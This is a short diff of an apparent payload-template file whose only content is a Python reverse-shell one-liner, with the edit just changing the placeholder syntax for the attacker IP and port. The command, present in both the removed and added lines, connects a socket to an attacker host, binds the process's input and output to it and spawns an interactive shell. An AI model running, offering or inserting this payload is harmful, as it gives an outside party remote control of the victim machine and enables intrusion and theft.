@@ -6,4 +6,4 @@ metadata:
   author: "Unknown"
 
 content: |
-  python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("<%=$(esh variables/attacker_ip)%>",<%=$(esh variables/shell_port)%>));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")'
+  python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("{{ attacker_ip }}",{{ shell_port }}));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")'
